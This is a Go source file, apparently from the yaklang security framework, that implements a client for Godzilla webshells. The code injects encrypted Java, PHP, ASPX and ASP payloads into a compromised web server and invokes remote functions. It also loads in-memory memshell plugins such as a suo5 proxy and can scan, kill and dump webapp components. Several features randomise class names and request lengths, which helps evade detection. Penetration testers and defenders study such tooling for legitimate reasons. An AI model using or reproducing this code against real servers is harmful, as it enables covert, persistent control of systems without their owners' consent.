package wsm

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla/plugin"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

type Godzilla struct {
	Url string
	//
	// 连接参数
	Pass string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string
	// 加密模式
	EncMode string
	Proxy   string
	Client  *http.Client
	// 自定义 header 头
	Headers map[string]string
	// request 开头的干扰字符
	reqPrefixLen int
	// request 结尾的干扰字符
	reqSuffixLen int

	dynamicFuncName map[string]string

	CustomEncoder EncoderFunc
}

func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
	client := utils.NewDefaultHTTPClient()
	gs := &Godzilla{
		Url:             ys.GetUrl(),
		Pass:            ys.GetPass(),
		SecretKey:       secretKey(ys.GetSecretKey()),
		ShellScript:     ys.GetShellScript(),
		EncMode:         ys.GetEncMode(),
		Proxy:           "",
		Client:          client,
		Headers:         make(map[string]string, 2),
		dynamicFuncName: make(map[string]string, 2),
	}
	gs.CustomEncoder = func(raw []byte) ([]byte, error) {
		enPayload, err := godzilla.Encryption(raw, gs.SecretKey, gs.Pass, gs.EncMode, gs.ShellScript, true)
		if err != nil {
			return nil, err
		}
		return enPayload, nil
	}
	gs.setHeaders()
	//gs.setProxy()
	return gs, nil
}

func (g *Godzilla) setDefaultParams() map[string]string {
	// TODO 添加所有参数
	g.dynamicFuncName["test"] = "test"
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
	g.dynamicFuncName["execCommand"] = "execCommand"
	return g.dynamicFuncName
}

func (g *Godzilla) setHeaders() {
	switch g.EncMode {
	case ypb.EncMode_Base64.String():
		g.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.EncMode_Raw.String():
	default:
		panic("shell script type error [JSP/JSPX/ASP/ASPX/PHP]")
	}
}

func (g *Godzilla) setProxy() {
	g.Client.Transport = &http.Transport{
		Proxy: func(r *http.Request) (*url.URL, error) {
			return url.Parse(fmt.Sprintf("http://%v", "127.0.0.1:9999"))
		},
	}
}

func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
	var payload []byte
	var err error
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		payload, err = hex.DecodeString(godzilla.JavaClassPayload)
		if err != nil {
			return nil, err
		}
		//payload, err = g.dynamicUpdateClassName("payloadv4", payload)
		//payload, err = g.dynamicUpdateClassName("payload", payload)
		//if err != nil {
		//	return nil, err
		//}
	case ypb.ShellScript_PHP.String():
		payload, err = hex.DecodeString(godzilla.PhpCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	case ypb.ShellScript_ASPX.String():
		payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		payload, err = hex.DecodeString(godzilla.AspCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	}
	return payload, nil
}

// 修改并且记录修改前后的对应关系
func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) ([]byte, error) {
	clsObj, err := javaclassparser.Parse(classContent)
	if err != nil {
		return nil, err
	}
	fakeSourceFileName := utils.RandNumberStringBytes(8)
	err = clsObj.SetSourceFileName(fakeSourceFileName)
	if err != nil {
		return nil, err
	}
	// 原始的 class 就叫 payloav4,代表哥斯拉 v4 版本
	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"

	// 替换 execCommand() 函数为 execCommand2() 函数, 这里只是暂时一下替换函数名的功能
	//err = clsObj.SetMethodName("execCommand", "execCommand2")
	//if err != nil {
	//	return nil, err
	//}
	//g.dynamicFuncName["execCommand"] = "execCommand2"

	newClassName := payloads.RandomClassName()
	// 随机替换类名
	err = clsObj.SetClassName(newClassName)
	if err != nil {
		return nil, err
	}
	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
	g.dynamicFuncName[oldName] = newClassName
	return clsObj.Bytes(), nil
}

//func (g *Godzilla) enCryption(binCode []byte) ([]byte, error) {
//	enPayload, err := godzilla.Encryption(binCode, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, true)
//	if err != nil {
//		return nil, err
//	}
//	return enPayload, nil
//}

//func gNativeCryption(raw []byte) EncoderFunc {
//	return func(info interface{}) ([]byte, error) {
//		g := info.(*Godzilla)
//		enPayload, err := godzilla.Encryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, true)
//		if err != nil {
//			return nil, err
//		}
//		return enPayload, nil
//	}
//}

func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
	if err != nil {
		return nil, err
	}
	return deBody, nil
}

func (g *Godzilla) post(data []byte) ([]byte, error) {
	request, err := http.NewRequest(http.MethodPost, g.Url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	for k, v := range g.Headers {
		request.Header.Set(k, v)
	}
	resp, err := g.Client.Do(request)
	if err != nil {
		return nil, err
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Error(err)
		}
	}(resp.Body)
	raw, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	raw = bytes.TrimRight(raw, "\r\n\r\n")
	return raw, nil
}

func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
	body, err := g.post(data)
	if err != nil {
		return nil, err
	}
	if len(body) == 0 {
		return nil, utils.Error("返回数据为空")
	}
	return g.deCryption(body)
}

// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
	r1, r2 := utils.RandStringBytes(100), utils.RandStringBytes(10)
	parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		switch g.ShellScript {
		case ypb.ShellScript_JSPX.String():
			fallthrough
		case ypb.ShellScript_JSP.String():
			parameter.AddString("evalClassName", g.dynamicFuncName[className])
		case ypb.ShellScript_ASPX.String():
			parameter.AddString("evalClassName", className)
		case ypb.ShellScript_ASP.String():
			fallthrough
		case ypb.ShellScript_PHP.String():
			parameter.AddString("codeName", className)

		}
	}
	parameter.AddString("methodName", funcName)
	data := parameter.Serialize()
	//enData, err := g.enCryption(data)
	enData, err := g.CustomEncoder(data)
	if err != nil {
		return nil, err
	}
	return g.sendPayload(enData)
}

func newParameter() *godzilla.Parameter {
	return godzilla.NewParameter()
}

// Include 远程 shell 加载插件
func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
	parameter := newParameter()
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		//binCode, err := g.dynamicUpdateClassName(codeName, binCode)
		//if err != nil {
		//	return false, err
		//}
		g.dynamicFuncName[codeName] = codeName
		codeName = g.dynamicFuncName[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result, err := g.EvalFunc("", "include", parameter)
			if err != nil {
				return false, err
			}
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true, nil
			} else {
				return false, utils.Error(resultString)
			}
		} else {
			return false, utils.Errorf("类: %s 映射不存在", codeName)
		}
	case ypb.ShellScript_ASPX.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "include", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	case ypb.ShellScript_ASP.String():
	case ypb.ShellScript_PHP.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "includeCode", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	}
	return false, nil
}

func (g *Godzilla) InjectPayload() error {
	payload, err := g.getPayload("")
	if err != nil {
		return err
	}
	enc, err := godzilla.Encryption(payload, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, false)

	if err != nil {
		return err
	}
	_, err = g.post(enc)
	if err != nil {
		return err
	}
	return nil
}

func (g *Godzilla) InjectPayloadIfNoCookie() error {
	u, _ := url.Parse(g.Url)
	if len(g.Client.Jar.Cookies(u)) == 0 {
		err := g.InjectPayload()
		if err != nil {
			return err
		}
	}
	return nil
}

// 销毁一个会话中的全部数据,这样做的效果有，清除目标服务器上的 sess_PHPSESSID 文件
func (g *Godzilla) close() (bool, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "close", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

//func (g *Godzilla) Encoder(f func(raw []byte) ([]byte, error)) ([]byte, error) {
//	g.CustomEncoder = encoderFunc
//	return nil, nil
//}

func (g *Godzilla) Encoder(encoderFunc func(raw []byte) ([]byte, error)) {
	g.CustomEncoder = encoderFunc
}

func (g *Godzilla) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		g.Url,
		g.SecretKey,
		g.ShellScript,
		g.Proxy,
		g.Headers,
	)
}

func (g *Godzilla) GenWebShell() string {
	return ""
}

func (g *Godzilla) Ping(opts ...behinder.ParamsConfig) (bool, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return false, nil
	}
	parameter := newParameter()
	result, err := g.EvalFunc("", "test", parameter)
	if err != nil {
		return false, err
	}
	if strings.Trim(string(result), " ") == "ok" {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

func (g *Godzilla) BasicInfo(opts ...behinder.ParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
	if err != nil {
		return nil, err
	}
	return basicsInfo, nil
}

func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	return nil, nil
}

// LoadSuo5Plugin load suo5 proxy with default memshell type as filter type
func (g *Godzilla) LoadSuo5Plugin(className string, memshellType string, path string) ([]byte, error) {
	var ok bool
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	if className == "" {
		className = "x.suo5"
	}

	switch memshellType {
	case "servlet":
		if path == "" {
			return nil, errors.New("`path` cannot be empty for servlet kind memshell")
		}
		ok, err = g.Include(className, plugin.GetSuo5MemServletByteCode())
	case "filter":
		ok, err = g.Include(className, plugin.GetSuo5MemFilterByteCode())
	default:
		ok, err = g.Include(className, plugin.GetSuo5MemFilterByteCode())
	}

	if !ok {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("path", path)
	result, err := g.EvalFunc(className, "run", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) LoadScanWebappComponentInfoPlugin(className string) ([]byte, error) {
	var ok bool
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	u, _ := url.Parse(g.Url)
	if len(g.Client.Jar.Cookies(u)) == 0 {
		err := g.InjectPayload()
		if err != nil {
			return nil, err
		}
	}
	if className == "" {
		className = "x.go0p"
	}

	g.dynamicFuncName["ScanWebappComponentInfo"] = className

	ok, err = g.Include(className, plugin.GetWebAppComponentInfoScanByteCode())
	if !ok {
		return nil, err
	}
	return nil, nil
}

// KillWebappComponent will unload component given
// kill `Servlet` need to provide `servletName` eg: `HelloServlet`
// kill `Filter` need to provide `filterName` eg: `HelloFilter`
// kill `Listener` need to provide `listenerClass` eg: `com.example.HelloListener`
// kill `Valve` need to provide `valveID` eg: `1`
// kill `Timer` need to provide `threadName`
// kill `Websocket` need to provide `websocketPattern` eg: `/websocket/EchoEndpoint`
// kill `Upgrade` need to provide `upgradeKey` eg: `version.txt` from goby ysoserial plugin generated
// kill `Executor` use a fixed value `recovery`
func (g *Godzilla) KillWebappComponent(componentType string, name string) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	viable := map[string]string{
		"servlet":   "0",
		"filter":    "1",
		"listener":  "2",
		"valve":     "3",
		"timer":     "4",
		"upgrade":   "5",
		"executor":  "6",
		"websocket": "7",
	}
	parameter := newParameter()
	parameter.AddString("action", "0")
	componentType = strings.ToLower(componentType)
	iType, ok := viable[componentType]
	if !ok {
		return nil, errors.New("no viable alternative for " + componentType)
	}
	parameter.AddString("type", iType)
	parameter.AddString("name", name)

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

// ScanWebappComponentInfo will return target webapp servlet, filter info
func (g *Godzilla) ScanWebappComponentInfo() ([]byte, error) {
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("action", "1")

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) DumpWebappComponent(classname string) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("action", "2")
	parameter.AddString("classname", classname)

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) CustomClassByteCodeDealer(classBytes []byte) (bool, error) { return false, nil }

func (g *Godzilla) InvokeCustomPlugin() ([]byte, error) { return nil, nil }
